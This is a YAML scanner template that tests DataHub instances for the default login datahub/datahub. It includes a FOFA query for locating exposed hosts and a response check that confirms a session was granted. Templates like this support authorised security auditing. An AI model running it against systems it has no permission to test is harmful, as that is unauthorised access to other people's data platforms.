id: poc-yaml-datahub-metadata-weak-password
info:
  name: DataHub Metadata 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: datahub
  fofa: title="DataHub"
requests:
- method: POST
  path: /logIn
  headers:
    Content-Type: application/json
  data: '{"username":"datahub","password":"datahub"}'
  expression: status_code == 200 && body == "" && contains(headers,"Set-Cookie\x3a
    actor=urn:li:corpuser:datahub;") && contains(headers,"PLAY_SESSION=")
variables: {}
transport: http
